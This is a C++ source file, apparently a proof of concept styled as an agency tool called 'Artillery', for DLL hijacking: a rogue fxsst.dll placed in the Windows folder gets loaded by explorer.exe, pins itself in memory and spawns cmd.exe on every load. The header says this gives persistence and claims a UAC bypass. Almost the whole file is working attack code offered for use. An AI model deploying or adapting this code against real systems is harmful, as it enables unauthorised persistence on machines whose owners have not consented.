/*
 * Filename: fxsst.cpp
 *
 * Classification:
 * Classified By: 
 *
 * Tool Name: Artillery
 * Requirement #:2022-1337
 *
 * Author: Hacker Fantastic
 * Date Created:        12/30/2023
 * Version 1.0:12/30/2023 (00:00)
 *
 * "This is a simple DLL hijacking attack that we have successfully 
 * tested against Windows XP,Vista and 7. A DLL named fxsst.dll normally 
 * resides in \Windows\System32 and is loaded by explorer.exe. Placing a 
 * new DLL with this name in \Windows results in this being loaded into 
 * explorer instead of the original DLL. On Windows Vista and above, the 
 * DLL‘s reference count must be increased by calling LoadLibrary on itself 
 * to avoid being unloaded."
 * 
 * This code will persist a "cmd.exe" which will be present when explorer.exe
 * restarts or the host rebooted. This is a PoC for Artillery which is an AED
 * example to bypass UAC and obtain persistence.
 */
#include "pch.h"
#include <windows.h>

#pragma comment(lib,"User32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Increase the DLL's reference count
        TCHAR szModulePath[MAX_PATH];
        if (GetModuleFileName(hModule, szModulePath, MAX_PATH))
        {
            LoadLibrary(szModulePath);
        }
        // Create a new console with cmd.exe running - this will not have elevated rights but is persisted. 
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        wchar_t cmd[] = L"cmd.exe";  // non-const wchar_t array
        if (!CreateProcess(NULL,   // No module name (use command line)
            cmd,        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            0,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
            )
        {
            return FALSE;
        }
        // Close process and thread handles. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

